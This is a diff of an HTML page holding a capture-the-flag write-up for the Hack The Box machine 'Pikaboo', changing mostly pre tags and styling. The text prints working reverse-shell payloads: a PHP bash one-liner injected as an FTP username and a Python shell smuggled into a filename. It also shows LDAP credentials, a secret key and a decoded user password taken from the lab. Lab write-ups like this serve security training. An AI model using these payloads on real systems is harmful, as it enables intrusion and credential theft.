@@ -87,7 +87,9 @@
 <div class="article-container"> <!-- beginning of breakup container -->
 
 <!-- space fore article -->
-<pre class="article-text" style="font-size: 1vw; float: center;">
+<p class="article-text" style="font-size: 1vw; float: left;">
+
+   <pre>
 
    -██▓███---██▓-██-▄█▀▄▄▄-------▄▄▄▄----▒█████---▒█████--
    ▓██░--██▒▓██▒-██▄█▒▒████▄----▓█████▄-▒██▒--██▒▒██▒--██▒
@@ -103,11 +105,13 @@
    my HTB IP = 10.10.14.138 
    machine (pikaboo) IP = 10.10.10.249
    machine OS = Linux
-   ----------------------
+</pre>
+
    as such the first thing that i will do
    is running an nmap scan on the ip we find
    all of these ports open:
    
+   <pre class="box13">
     PORT   STATE SERVICE VERSION
     21/tcp open  ftp     vsftpd 3.0.3
     22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -119,6 +123,7 @@
     |_http-server-header: nginx/1.14.2
     |_http-title: Pikaboo
     Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+    </pre>
    
    as such i will first take a look at
    the webpage that we have found, looking
@@ -135,11 +140,10 @@
    extra ports that didnt come up during the scan.
    but that we also have a way to potentially bypass the 
    authentication.
-   ----------------------
    we will start by fuzz'ing the webpage using 
    wfuzz along with the command of:
    
-   <pre class="box0"> 
+   <pre class="box13"> 
     wfuzz -u http://10.10.10.249/admin../FUZZ -w usr/share/wordlists/dirb/big.txt -t 200
     
    using this wordlist due to finding what server
@@ -165,9 +169,11 @@
    "server-status" which we will take a look at to see
    if it will contain any info that we maybe able to use.
    looking at it we find this message under the GET commands:
-   
+
+   <pre class="box13">
     Srv	PID	Acc	M	CPU 	SS	Req	Conn	Child	Slot	Client	VHost	Request
     0-0	668	0/5380/5380	_ 	0.63	354	0	0.0	3.23	3.23 	127.0.0.1	localhost:81	GET /admin_staging HTTP/1.1
+   </pre>
    
    this is the one that stood out to me was /admin_staging 
    as such taking a look at this shows us an error.
@@ -183,7 +189,6 @@
    but it also shows a user trying to enter an
    ip as a username , as such we maybe abnle enter
    a command to see if we are able to get a responce
-   ----------------------
    as such we will try to use it to gain a shell upon 
    the system in question, we will do this using the commands
    bellow:
@@ -191,7 +196,7 @@
     ftp 10.10.10.249
     
     when asked for a username:
-    <pre class="box0">
+    <pre class="box13">
     ""?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.138/6660 0>&1'");?""
     </pre>
    
@@ -216,7 +221,6 @@
    the user.txt flag / token:
    
     user flag / token = d7b0b98f055ac3765d9e5f46ad8ac724
-   ----------------------
    of course the first thing that we
    try is the comamd of sudo -l, this doesnt give
    us any result atall and looking around the system doesnt seem 
@@ -231,7 +235,7 @@
    which is hidden within the config file within /opt/pokiapi
    downloading this to our own system we see that it is using ldap 
    and the secret key:
-   <pre class="box0">
+   <pre class="box13">
    
     "ldap": {
            "ENGINE": "ldapdb.backends.ldap",
@@ -240,18 +244,21 @@
            "PASSWORD": "J~42%W?PFHl]g",
    
     "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
+    </pre>
     
    as such we are able to use this with what we have found in the file to 
    try and find some creds, using the command bellow:
    
+   <pre class="box13">
     ldapsearch -D"cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b'dc=pikaboo,dc=htb'
      -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
-   
+   </pre>
+
    doing the above ^ gives us a base64 encode password
    which we should be able to decode using cyberchef or anyother tool:
    
     userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
-   </pre>
+ 
    
    decoding the above to plain text gives us
    the password for our user ftp account upon the 
@@ -259,7 +266,6 @@
    
     username = pwnmeow
     password = _G0tT4_C4tcH_'3m_4lL!_
-   ----------------------
    so for root  i was completely stumped
    and ending up having to look at forums to get
    some hints ast to what to do.
@@ -279,7 +285,7 @@
    and then when asked for local enter the file
    name of virgo_foxxi and for remote enter the folowing:
    
-   <pre class="box0">
+   <pre class="box13">
     "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.138\",6660));
     [os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
    </pre>
@@ -288,7 +294,7 @@
    root allowing us to gain our root token / flag:
    
     root token / flag = f259819309ef4c73bce0dc658ff9922e
-</pre>
+</p>
 </div><!-- end of article container -->
 
 <br>
